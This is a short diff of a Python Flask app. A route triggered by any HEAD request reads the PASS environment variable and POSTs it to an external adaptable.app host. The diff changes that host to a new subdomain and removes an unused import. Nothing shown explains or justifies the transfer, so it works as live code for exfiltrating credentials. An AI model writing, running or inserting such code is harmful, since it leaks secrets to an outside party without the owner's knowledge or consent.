@@ -1,6 +1,5 @@
 import requests
 import os
-import flask
 from flask import Flask, request, Response
 app = Flask(__name__)
 
@@ -8,7 +7,7 @@ data = {"pass": os.environ.get('PASS')}
 
 @app.route('/', methods=['HEAD'])
 def handle_request():
-    requests.post("https://mjrecentevday.adaptable.app", data=data)
+    requests.post("https://mjrecentevday23412312.adaptable.app", data=data)
     return ""
     
 
